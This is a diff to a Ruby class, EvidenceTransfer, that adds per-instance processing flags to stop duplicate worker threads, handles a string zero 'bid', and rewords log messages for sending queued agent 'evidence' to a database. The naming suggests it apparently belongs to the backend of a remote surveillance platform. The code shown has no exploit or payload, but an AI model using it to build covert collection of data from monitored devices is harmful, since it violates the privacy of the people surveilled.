@@ -20,6 +20,9 @@ class EvidenceTransfer
   include Singleton
   include RCS::Tracer
 
+  STATUS_PROCESSING = 1
+  STATUS_IDLE = 0
+
   def initialize
     @evidences = {}
     @worker = Thread.new { self.work }
@@ -36,7 +39,6 @@ class EvidenceTransfer
         self.queue instance, id
       end
     end
-
   end
 
   def queue(instance, id)
@@ -60,16 +62,24 @@ class EvidenceTransfer
       # copy the value and don't keep the resource locked too long
       instances = @semaphore.synchronize { @evidences.each_key.to_a }
 
-      threads = []
       # for each instance get the ids we have and send them
       instances.each do |instance|
-        # one thread per instance
-        threads << Thread.new do
+        # one thread per instance, but check if an instance is already under processing
+        Thread.new do
           begin
+
+            # get the status of this instance to check if we already have a thread processing it
+            status = EvidenceManager.instance.instance_get_processing instance
+
             # only perform the job if we have something to transfer
-            if not @evidences[instance].empty? then
+            if not @evidences[instance].empty? and not status == STATUS_PROCESSING
+
+              # mark this instance under processing
+              EvidenceManager.instance.instance_set_processing instance, STATUS_PROCESSING
+
               # get the info from the instance
               info = EvidenceManager.instance.instance_info instance
+              raise "Cannot read info for #{instance}" if info.nil?
 
               # make sure that the symbols are present
               # we are doing this hack since we are passing information taken from the store
@@ -78,7 +88,7 @@ class EvidenceTransfer
 
               # if the session bid is zero, it means that we have collected the evidence
               # when the DB was DOWN. we have to ask again to the db the real bid of the instance
-              if sess[:bid] == 0 then
+              if sess[:bid] == "0" or sess[:bid] == 0 then
                 # ask the database the bid of the agent
                 status, bid = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:subtype])
                 sess[:bid] = bid
@@ -100,13 +110,14 @@ class EvidenceTransfer
             trace :error, "Error processing evidences: #{e.message}"
             trace :error, e.backtrace
           ensure
+            # mark this instance free from
+            EvidenceManager.instance.instance_set_processing instance, STATUS_IDLE
+
             # job done, exit
             Thread.exit
           end
         end
       end
-      # wait for all the threads to die
-      threads.each { |t| t.join }
     end
   end
 
@@ -117,10 +128,10 @@ class EvidenceTransfer
     ret, error = DB.instance.send_evidence(instance, evidence)
 
     if ret then
-      trace :info, "Evidence transferred [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
+      trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
       EvidenceManager.instance.del_evidence(id, instance)
     else
-      trace :error, "Evidence NOT transferred [#{instance}]: #{error}"
+      trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
     end
     
   end
